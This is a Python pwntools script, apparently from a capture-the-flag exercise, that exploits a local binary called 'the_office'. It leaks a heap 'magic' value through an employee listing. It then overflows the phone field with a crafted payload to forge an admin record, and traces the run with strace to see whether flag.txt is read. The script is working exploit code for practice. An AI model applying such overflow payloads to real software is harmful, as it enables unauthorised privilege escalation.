import sys, re, struct, time
sys.path.insert(0, "/mnt/d/ctf-index")
from pwn import context, process
context.log_level = "error"
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "/mnt/d/ctf-index/_z_172_exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

io = process(["strace", "-f", "-e", "trace=openat,open,write", "-o", "/tmp/office/st.log", "./the_office"])
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28)
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
magic = int(re.findall(r"Bldg #: (\d+)", ex.listemps(io).decode("latin-1"))[-1])
print("magic = 0x%08x" % magic)
ex.remove(io, 0)
payload = b"A" * 28 + struct.pack("<I", magic) + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
io.sendline(b"4")
time.sleep(1.0)
try:
    print("recu:", repr(io.recv(65536, timeout=2)))
except Exception as e:
    print("recv:", e)
io.close()
time.sleep(0.3)
log = open("/tmp/office/st.log", errors="replace").read()
print("=== lignes flag.txt ===")
for ln in log.splitlines():
    if "flag" in ln:
        print(ln)
print("=== derniers writes ===")
for ln in log.splitlines()[-8:]:
    print(ln)
